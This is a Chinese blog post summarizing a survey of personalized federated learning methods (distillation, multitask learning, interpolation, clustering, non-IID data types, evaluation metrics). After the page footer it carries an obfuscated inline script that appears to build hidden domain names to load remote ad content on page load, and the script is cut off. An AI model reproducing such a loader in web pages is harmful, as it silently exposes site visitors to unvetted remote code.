<li> <p><strong>数据增强 Data Augmentation</strong><br> <strong>优点</strong>：易于实施，可以建立在一般的FL训练程序之上<br> <strong>缺点</strong>：<br> 1、隐私泄露的可能性<br> 2、可能需要一个有代表性的代理数据集</p> </li>
<li> <p><strong>挑选客户端 Client Selection</strong><br> <strong>优点</strong>：仅修改一般FL培训程序中的客户选择策略<br> <strong>缺点</strong>：<br> 1、增加了来自客户端子集优化的计算开销<br> 2、可能需要一个有代表性的代理数据集</p> </li>
<li> <p><strong>增加模型局部损失正则项 Regularized Local Loss</strong><br> <strong>优点</strong>：易于实现，对FedAvg算法进行了轻微的修改<br> <strong>缺点</strong>：单一全局模型设置</p> </li>
<li> <p><strong>元学习 Meta-learning</strong><br> <strong>优点</strong>：优化全局模型，以实现快速的个性化<br> <strong>缺点</strong>：<br> 1、单一全局模型设置<br> 2、计算二阶梯度的计算代价昂贵</p> </li>
<li> <p><strong>迁移学习 Transfer learning</strong><br> <strong>优点</strong>：通过减少全局模型和局部模型之间的领域差异来改进个性化<br> <strong>缺点</strong>：单一全局模型设置</p> </li>
</ul> 
<h2>
<a id="22__250"></a>2.2 学习个性化模型</h2> 
<p>本节将介绍遵循个性化模型学习策略的PFL方法。分为（i）基于架构的方法和（ii）基于相似性的方法</p> 
<h3>
<a id="221__254"></a>2.2.1 基于架构的方法</h3> 
<p>基于架构的PFL方法旨在通过针对每个客户机进行定制的模型设计来实现个性化。<strong>参数解耦</strong>方法为每个客户端实现了个性化层，而<strong>知识蒸馏</strong>方法则支持针对每个客户端的个性化模型架构</p> 
 
 <img src="https://images2.imgbox.com/df/5e/BpugcI4q_o.png"> 
 <br> 
 <div>
  基于结构的个性化方案。包含参数解耦和知识蒸馏 
 </div> 
 
<h4>
<a id="2211__Parameter_Decoupling_267"></a>2.2.1.1 参数解耦 Parameter Decoupling</h4> 
<p>参数解耦旨在通过将局部私有模型参数与全局FL模型参数解耦来实现PFL。私有参数在客户端上进行本地训练，不与FL服务器共享。这使得特定任务的表征可以被学习，以加强个性化。</p> 
<p>通常有两种配置用于深度学习的参数解耦。</p> 
<p>第一种是"<strong>基础层+个性化层</strong>"设计。在这种设置中，个性化的深层被客户保留在本地训练中，以学习个性化的特定任务表征，而基础层则与FL客户端共享，以学习低层次的通用特征。</p> 
<p>第二种设计考虑了<strong>每个客户端的个性化数据特征表征</strong>。</p> 
<blockquote> 
 <ul><li>局部全局联合训练（LG-FedAvg）被提出来结合局部表征学习和全局联合训练。学习低维的局部表征可以提高联合全球模型训练的通信和计算效率。它还提供了灵活性，因为可以根据源数据的模式（如图像和文本）设计专门的编码器。作者还展示了如何通过将对抗性学习纳入FL模型训练来学习对受保护属性（如种族和性别）不变的公平和无偏见的表征。<br> P. P. Liang, T. Liu, and L. Ziyin et al., “Think locally, act globally: Federated learning with local and global representations,” arXiv:2001.01523, 2019.</li></ul> 
</blockquote> 
<p>参数解耦与另一种分布式和私有的机器学习范式——分割学习（SL, split learning）有一些相似之处。</p> 
<p>在SL中，深度网络在服务器和客户端之间被分层。与参数解耦不同，SL中的服务器模型不会被转移到客户端进行模型训练。相反，在前向传播过程中，只有客户端模型分割层的权重是共享的，在反向传播过程中，分割层的梯度与客户端共享。因此，SL比FL有隐私优势，因为服务器和客户端不能完全访问全球和本地模型。然而，由于客户端的顺序训练过程，训练的效率较低。SL在非IID数据上的表现也比FL差，并且有更高的通信开销。</p> 
<h4>
<a id="2212__Knowledge_Distillation_283"></a>2.2.1.2 知识蒸馏 Knowledge Distillation</h4> 
<p>在横向联邦学习(HFL)中，FL服务器和FL客户端都采用了相同的模型架构。基本的假设是在客户端有足够的通信带宽和计算能力。然而，对于具有大量边缘设备作为FL客户端的实际应用，它们往往是资源紧张的。由于培训目标的不同，客户也可能会选择拥有不同的模型架构。FL中知识蒸馏的关键动机是实现更大程度的灵活性，以为客户适应个性化的模型架构。同时，它还试图通过减少资源需求来解决通信和计算能力的挑战。</p> 
<p>神经网络的知识蒸馏是一种将知识从教师模型集合转移到轻量级学生模型的准范式。在现有的FL蒸馏方法中，知识通常被表示为类分数或logit输出。一般来说，<strong>基于蒸馏的FL架构有四种主要类型：</strong>(i)向每个FL客户学习更强的个性化模型，(ii)学习FL服务器的服务器模型，(iii)FL客户端和FL服务器的双向蒸馏，以及(iv)客户端之间的蒸馏。</p> 
<blockquote> 
 <ul>
<li>Li，Wang提出了FedMD，一个基于蒸馏的FL框架，它允许客户通过KD使用自己的私有数据来设计不同的模型。学习是通过使用公共数据集上的平均类分数计算的共识进行的。对于每一轮通信，每个客户端基于更新的共识使用公共数据集训练其模型，然后在其私有数据集上对其模型进行微调。这使得每个客户能够在获得自己的个性化模型的同时利用来自其他客户的知识。<br> D. Li and J. Wang, “Fedmd: Heterogenous federated learning via model distillation,” arXiv:1910.03581, 2019.</li>
<li>Zhu，Hong等人提出了FedGen，一个无数据的蒸馏框架，可以为FL客户提取知识。生成模型在FL服务器中进行训练，并向客户端进行广播。然后，每个客户端在特征空间上生成增强表示，使用学习到的知识作为归纳偏差，以调节其局部学习。<br> Z. Zhu, J. Hong, and J. Zhou, “Data-free knowledge distillation for heterogeneous federated learning,” in ICML, 2021.</li>
<li>Lin，Kong等人提出了FedDF算法。它假设的一个设置是，由于不同的计算能力，边缘客户端需要不同的模型架构。FL服务器构建了一个不同的原型模型，每个模型代表具有相同模型架构的客户端(例如，ResNet，MobileNet)。对于每一轮通信，首先在来自同一原型组的客户机之间执行FedAvg，以初始化一个学生模型。然后通过集成蒸馏进行交叉架构学习，其中客户端（教师）模型参数在一个未标记的公共数据集上进行评估，以生成logit输出，用于训练FL服务器中的每个学生模型。<br> T. Lin, L. Kong, S. U. Stich, and M. Jaggi, “Ensemble distillation for robust model fusion in federated learning,” in NeurIPS, vol. 33, 2020,pp. 2351–2363.</li>
<li>在同一FL训练过程中，在FL客户端和FL服务器之间也可以以双向的方式提炼知识：He，Annavaram等人提出了组知识转移(FedGKT)来提高资源受限的边缘设备的模型个性化性能。它使用双向最小化方法来训练小边缘模型和大型服务器模型。<br> C. He, M. Annavaram, and S. Avestimehr, “Group knowledge transfer: Federated learning of large cnns at the edge,” in NeurIPS, vol. 33,2020, pp. 14 068–14 080.</li>
<li>基于kd的PFL也可以在分布式设置中进行，知识在网络中的邻近客户机之间传输：在[58]中，作者提出了一种架构不可知的分布式设备学习算法-d-蒸馏。<br> I. Bistritz, A. Mann, and N. Bambos, “Distributed distillation for ondevice learning,” in NeurIPS, vol. 33, 2020, pp. 22 593–22 604.</li>
</ul> 
</blockquote> 
<h3>
<a id="222__299"></a>2.2.2 基于相似性的方法</h3> 
<p>基于相似性的方法旨在通过对客户关系建模来实现个性化。为每个客户学习一个个性化的模型，相似的客户学习类似的模型。</p> 
<p><strong>多任务学习（MTL）<strong>和</strong>模型插值</strong>考虑的是成对的客户关系，而<strong>聚类</strong>考虑的是群组级别客户关系。</p> 
 
 <img src="https://images2.imgbox.com/91/f9/790pMyEt_o.png"> 
 <br> 
 <div>
  基于相似性的PFL方法：（1）多任务学习；（2）模型差值；（3）聚类 
 </div> 
 
<h4>
<a id="2221__Multitask_learning_MTL_316"></a>2.2.2.1 多任务学习 Multitask learning (MTL)</h4> 
<p>多任务学习(MTL)的目标是训练一个共同执行多个相关任务的模型。这通过在学习任务中利用特定领域的知识来提高了泛化效果。通过将每个FL客户端视为MTL中的一项任务，有可能学习和捕捉客户之间由其异质的本地数据表现出来的关系。</p> 
<blockquote> 
 <ul>
<li>MOCHA算法将分布式MTL扩展到FL环境中。MOCHA使用原始-对偶公式来优化所学模型。该算法解决了FL中普遍存在的通信和系统挑战，而这些挑战在MTL领域是没有考虑的。与传统的FL设计不同，MOCHA学习的是单一的全局模型，它为每个FL客户端学习了一个个性化的模型。虽然MOCHA提高了个性化程度，但它并不适合于跨设备的FL应用，因为所有的客户端都需要参与每一轮的FL模型训练。MOCHA的另一个缺点是，它只适用于凸模型，因此不适合深度学习。<br> V. Smith, C.-K. Chiang, M. Sanjabi, and A. Talwalkar, “Federated Multi-Task Learning,” in NeurIPS, vol. 30, 2017, pp. 4427–4437.</li>
<li>Huang，Chu等人提出了FedAMP，这是一种基于注意力的机制，可以在具有相似数据分布的FL客户端之间加强更强的成对协作。与由服务器维护单个全局模型的标准FL框架相比，FedAMP为服务器中的每个客户端维护一个个性化的云模型<span class="katex--inline"><span class="katex"><span class="katex-mathml">
      
       
        
         
          
           u
          
          
           c
          
         
        
        
         u_c
        
       
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>。<br> Y. Huang, L. Chu, Z. Zhou, L. Wang, J. Liu, J. Pei, and Y. Zhang, “Personalized cross-silo federated learning on non-iid data,” in AAAI,vol. 35, no. 9, 2021, pp. 7865–7873.</li>
<li>FedCurv使用EWC来防止在跨学习任务中移动时的灾难性遗忘。利用Fisher信息矩阵估计参数的重要性，并进行惩罚步骤来保留重要参数。在每一轮通信结束时，每个客户端将其更新后的本地参数和其Fisher信息矩阵的对角线发送给服务器。这些参数将由所有客户共享，以便在下一轮的培训中进行本地培训。<br> N. Shoham, T. Avidor, A. Keren, N. Israel, D. Benditkis, L. Mor-Yosef, and I. Zeitak, “Overcoming forgetting in federated learning on non-iid data,” arXiv:1910.07796, 2019.</li>
</ul> 
</blockquote> 
<h4>
<a id="2222__model_interpolation_326"></a>2.2.2.2 模型插值 model interpolation</h4> 
<blockquote> 
 <ul>
<li>Hanzely 等人提出使用全局和局部模型的混合来学习个性化的模型，以平衡泛化和个性化。每个FL客户学习一个单独的本地模型。惩罚参数λ被用来阻止局部模型与平均模型太不相似。当λ被设置为零时，发生纯局部模型学习。这相当完全PFL设置，其中每个客户端在本地训练自己的模型，而不与其他客户端进行任何通信。随着λ的增加，出现了混合模型学习，局部模型变得越来越相似。设置近似全局模型学习，当λ趋于无穷大时，强制所有局部模型相同。通过这种方式，可以控制个性化的程度。此外，作者还提出了一种沟通效率高的SGD变体，称为无环局部梯度下降(L2GD)。通过确定是执行局部GD步骤还是执行模型聚合步骤的概率框架，显著减少了通信轮数。<br> F. Hanzely and P. Richt´arik, “Federated Learning of a Mixture of Global and Local Models,” arXiv:2002.05516, 2020.</li>
<li>Deng等人提出了APFL算法，其目标是以一种高效通信的方式找到全局和局部模型的最优组合。他们为每个客户端引入了一个混合参数，该参数在FL训练过程中自适应学习，以控制全局和局部模型的权重。这使得每个客户端都可以获得可学习到的最佳个性化程度。如果局部和全局数据分布没有很好地对齐，则在一个特定的局部模型上的加权因子预计会更大，反之亦然。Mansour等人提出了一个类似的公式，包括局部模型和全局模型的联合优化来确定最优插值权重。<br> Y. Deng, M. M. Kamani, and M. Mahdavi, “Adaptive Personalized Federated Learning,” arXiv:2003.13461, 2020.<br> Y. Mansour, M. Mohri, J. Ro, and A. T. Suresh, “Three Approaches for Personalization with Applications to Federated Learning,” arXiv:2002.10619, 2020.</li>
<li>Diao，Ding等人提出了HeteroFL框架，该框架基于单一的全局模型，训练具有不同计算复杂性的局部模型。通过根据每个客户端的计算和通信能力，自适应地分配不同复杂度级别的局部模型，实现了PFL来解决边缘计算场景中的系统异构性。<br> E. Diao, J. Ding, and V. Tarokh, “Heterofl: Computation and communication efficient federated learning for heterogeneous clients,” in ICLR,2021.</li>
</ul> 
</blockquote> 
<h4>
<a id="2222__clustering_336"></a>2.2.2.2 聚类 clustering</h4> 
<p>对于在客户机或数据分布之间存在显著不同的固有分区的应用，采用客户机-服务器的FL体系结构来训练共享的全局模型<strong>并不是最优的</strong>。<strong>针对每个同质客户组训练一个FL模型的多模型方法更适合</strong>。最近的一些工作都集中在FL个性化的聚类上。<strong>基于聚类的FL的基本假设是存在一个基于本地数据分布的自然分组。</strong></p> 
<blockquote> 
 <ul>
<li>层次聚类作为一个后处理步骤被合并到FL中。采用一种基于客户端梯度更新余弦相似度的最优双划分算法，将FL客户端划分为聚类。由于需要多个通信轮来分离所有不一致的客户端，递归双分区聚类框架导致高的计算和通信成本，限制了大规模设置的实际可行性<br> F. Sattler, K.-R. M¨uller, and W. Samek, “Clustered federated learning: Model-agnostic distributed multitask optimization under privacy constraints,” IEEE TNNLS, vol. 32, no. 8, pp. 3710–3722, 2020.</li>
<li>Briggs，Fan等人提出了另一种针对FL的层次聚类框架。它使用一个凝聚层次聚类公式，将聚类减少到一个步骤，以降低计算和通信负载。该过程首先训练一个t通信轮的全局FL模型。然后在所有客户端的私有数据集上对全局模型进行微调，以确定全局模型参数w和局部模型参数<span class="katex--inline"><span class="katex"><span class="katex-mathml">
      
       
        
         
          
           θ
          
          
           c
          
         
        
        
         θ_c
        
       
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.8444em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0278em">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em"><span class="" style="margin-left: -0.0278em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>之间的差异<span class="katex--inline"><span class="katex"><span class="katex-mathml">
      
       
        
         
          
           ∆
          
          
           w
          
         
        
        
         ∆_w
        
       
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.3014em;vertical-align: -0.15em"></span><span class="mord"><span class="mord">∆</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0269em">w</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>。所有客户端的∆w值被用作凝聚层次集群算法的输入，以生成多个客户端集群。然后对每个客户端集群独立执行FL训练，以生成多个联邦模型。这种方法是为更广泛的非IID设置而设计的，并允许在每一轮的FL模型培训中对客户的一个子集进行培训。然而，在有大量客户端时，凝聚聚类中计算所有客户端之间的成对距离可以计算密集型。<br> C. Briggs, Z. Fan, and P. Andras, “Federated learning with hierarchical clustering of local updates to improve training on non-IID data,” in IJCNN, 2020, pp. 1–9.</li>
<li>其他的聚类方法需要在FL训练开始时设置固定数量的聚类。Ghosh，Chung等人提出了迭代联邦聚类算法(IFCA)。服务器不是单个全局模型，而是构建K个全局模型，并将这些模型广播给所有客户端以进行本地损失计算。每个客户端被分配到K个集群中的一个，该集群的全局模型在客户端数据上达到最低的损失值。然后，由服务器执行集群分区中的基于集群的FL模型聚合。与FedAvg相比，IFCA的通信开销要高出K倍，因为服务器需要在每一轮通信中向所有客户端广播K个集群模型。<br> A. Ghosh, J. Chung, D. Yin, and K. Ramchandran, “An efficient framework for clustered federated learning,” in NeurIPS, vol. 33, 2020, pp. 19 586–19 597.</li>
<li>Huang等人提出了基于社区的FL(CBFL)来预测患者的住院时间和死亡率。他们训练了一个去噪自动编码器，并使用预先确定的聚类数量进行K-means聚类，以根据患者的私人数据的编码特征进行聚类。然后为每个集群训练一个FL模型。<br> L. Huang, A. L. Shea, H. Qian, A. Masurkar, H. Deng, and D. Liu, “Patient clustering improves efficiency of federated machine learning to predict mortality and hospital stay time using distributed electronic medical records,” J. Biomed. Inform., vol. 99, p. 103291, 2019</li>
<li>Duan，Liu等人提出了FedGroup，这是一个实现了静态客户端集群策略和一个新来的客户端冷启动机制。FedGroup使用基于分解余弦相似度(EDC)的欧氏距离的Kmeans++算法[71]对局部客户端更新进行聚类。<br> M. Duan, D. Liu, X. Ji, R. Liu, L. Liang, X. Chen, and Y. Tan, “Fedgroup: Efficient federated learning via decomposed similaritybased clustering,” in IEEE ISPA, 2021, pp. 228–237.<br> S. Vassilvitskii and D. Arthur, “k-means++: The advantages of careful seeding,” in ACM-SIAM, 2006, pp. 1027–1035.</li>
<li>Xie，Long等人提出了一个学习多个全局模型的多中心公式。<br> M. Xie, G. Long, T. Shen, T. Zhou, X. Wang, and J. Jiang, “MultiCenter Federated Learning,” arXiv:2005.01026, 2020.</li>
</ul> 
</blockquote> 
<h3>
<a id="223__353"></a>2.2.3 总结</h3> 
 
 <img src="https://images2.imgbox.com/c5/a0/x1V3QGTt_o.png"> 
 <br> 
 <div>
  基于学习个性化模型的各类方法的优缺点比较 
 </div> 
 
<p><strong>参数解耦 Parameter Decoupling</strong><br> <strong>优点</strong>：<br> 1、简单公式<br> 2、针对每个客户端的架构设计的分层灵活性<br> <strong>缺点</strong>：<br> 很难确定最优的私有化战略</p> 
<p><strong>知识蒸馏 Knowledge Distillation</strong><br> <strong>优点</strong>：<br> 1、高度的架构设计个性化<br> 2、沟通效率高<br> 3、支持资源异构性<br> <strong>缺点</strong>：<br> 1、很难确定最优的架构设计<br> 2、可能需要一个有代表性的代理数据集</p> 
<p><strong>多任务学习 Multitask learning (MTL)</strong><br> <strong>优点</strong>：利用成对的客户机关系，为相关的客户机学习类似的模型<br> <strong>缺点</strong>：对客户的数据质量差很敏感</p> 
<p><strong>模型插值 model interpolation</strong><br> <strong>优点</strong>：使用全局和局部模型混合的简单公式<br> <strong>缺点</strong>：使用单一的全局模型作为个性化的基础</p> 
<p><strong>聚类 clustering</strong><br> <strong>优点</strong>：适用于在客户端之间存在固有分区的应用<br> <strong>缺点</strong>：<br> 1、计算和通信成本高<br> 2、附加系统基础设施：集群管理和部署</p> 
<h1>
<a id="3_PFL_no_IID_397"></a>3 PFL实验评价设计 （no I.I.D的分类以及解决方法）</h1> 
 
 <img src="https://images2.imgbox.com/4a/62/8ArscoOC_o.png"> 
 <br> 
 <div>
  在PFL研究中考虑的非IID数据的类型 
 </div> 
 
<p>几种非独立同分布（no I.I.D.）的情况文章开始已经介绍过，现在我们重新介绍一下，同时上图也给出了不同情况的解决方法。</p> 
<ol>
<li> <p><strong>Quantity Skew 数量倾斜</strong>：FL客户端持有不同大小的本地数据集，有些客户端比其他客户端的数据量要大得多。由于跨FL客户机的不同使用模式，数据大小的异构性在现实环境中普遍存在。</p> </li>
<li> <p><strong>Feature Distribution Skew 特性分布倾斜</strong>：特性分布在不同客户端之间有所不同，而条件分布P(y|x)在不同客户端之间是相同的。例如，在健康监测应用程序中，用户的活动数据的分布根据他们的习惯和生活方式模式而差异很大。</p> </li>
<li> <p><strong>Label Distribution Skew 标签分布倾斜</strong>：标签分布在不同客户端之间有所不同，而条件分布P(x|y)在不同客户端之间是相同的。例如，在软件移动键盘中，标签分布偏差对来自不同人口统计数据的用户来说可能是一个可能的问题，因为存在不同的语言和文化细微差别，导致某些单词或表情符号主要被不同的用户使用。</p> </li>
<li> <p><strong>Label Preference Skew 标签偏好倾斜</strong>：条件分布Pc(x|y)在不同客户端之间有所不同，而标签分布P(y)在不同客户端之间是相同的。由于个人偏好，标签上可能会有不同。 跟上面提到的相同的特征，不同的标签相同。</p> </li>
</ol> 
<h1>
<a id="4_PFL_423"></a>4 PFL评估指标</h1> 
<p>PFL研究中采用的<strong>评价指标</strong>分为：1)<strong>模型性能相关</strong>，2)<strong>系统性能相关</strong>，3)<strong>值得信赖的AI相关指标.</strong></p> 
 
 <img src="https://images2.imgbox.com/bd/cc/ttY9zWYd_o.png"> 
 <br> 
 <div>
  PFL研究所采用的评价指标 
 </div> 
 
<ol><li><strong>模型性能相关</strong></li></ol> 
<p>模型性能可以通过<strong>精度(Accuracy)<strong>和</strong>收敛性(Convergence)<strong>来衡量。大多数PFL作品采用个性化模型的平均测试精度来衡量模型精度。虽然使用聚合精度指标可能足以评估训练单一全球共享模型的普通FL的性能，但这样的指标不能反映个别个性化模型的性能。因此，有一些PFL工作使用基于分布的评估框架，如</strong>直方图分析</strong>、<strong>方差指标</strong>和<strong>单个客户端级别</strong>的指标来评估个性化模型的性能。由于统计数据的异质性，每个客户都经历了不同的基线准确性，因此<strong>测量个性化前后模型准确性的变化</strong>是评估个性化的有用方法。模型的收敛性是通过<strong>训练损失</strong>，<strong>通信轮数</strong>，<strong>局部训练期数</strong>，和<strong>收敛界的形式化</strong>来衡量的。</p> 
<ol start="2"><li><strong>系统性能相关</strong></li></ol> 
<p>系统性能指标主要集中于<strong>通信效率（Communication Efficiency）</strong>、<strong>计算效率（Computational Efficiency）</strong>、<strong>系统的异构性（System Heterogeneity）</strong>、<strong>系统的可扩展性（System Scalability）<strong>和</strong>容错能力（Fault Tolerance）<strong>等方面。<br> <strong>通信效率</strong>通过通信轮数、参数数量和消息大小来评估。<strong>计算效率</strong>根据FLOPs数和训练时间来计算。通过模拟硬件能力和网络条件的变化来评估</strong>系统的异构性</strong>。这可以通过改变局部训练时期的数量、CPU资源和局部模型复杂度来实现。<strong>系统的可扩展性</strong>是根据在大量客户端上的性能、总运行时间和总内存消耗来评估的。<strong>容错性</strong>是根据不同比例的退出客户和掉队客户下的性能来衡量的。</p> 
<ol start="3"><li><strong>值得信赖的AI相关指标</strong></li></ol> 
<p>值得信赖的人工智能指标尚未被广泛用于评估PFL方法。有一些新兴的作品考虑了这些指标。利用<strong>局部模型的公平性和鲁棒性</strong>来评估该方法的性能。</p> 
<p>目前在PFL研究中评价个性化性能的方向主要集中在模型性能方面的准确性的提高。然而，也应该考虑到实现PFL的成本。在寻求精确的模型时，在系统的可伸缩性以及通信和计算开销方面往往存在权衡。可信的人工智能属性的实现也没有得到充分的考虑。设计一个有效的PFL框架是很重要的，它可以共同优化这些在现实世界的FL应用程序中是很重要的成本效益目标。鉴于PFL面临着独特的挑战和应用场景，因此必须加强针对PFL的评估指标的开发。</p> 
<ul><li class="task-list-item">
 <strong>论文的最后介绍了PFL未来有前途的研究方向，感兴趣的可以看一看。</strong>
</li></ul> 
<h1>
<a id="_457"></a>总结</h1> 
<p>这篇文章对当前个性化联邦学习的方法进行了分类，方便读者快速的选择自己合适的方法去学习，同时也给出了不同形式的非独立同分布(no I.I.D)数据对应的解决方案。后续我也会针对性的选择其中的一些论文去精读，欢迎大家一起讨论、学习。</p> 
<h2>
<a id="_463"></a>参考文章</h2> 
<p><a href="https://zhuanlan.zhihu.com/p/497934969">个性化联邦学习：综述</a><br> <a href="https://zhuanlan.zhihu.com/p/499716652">[论文笔记]个性化联邦学习 Towards Personalized Federated Learning</a></p>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x414043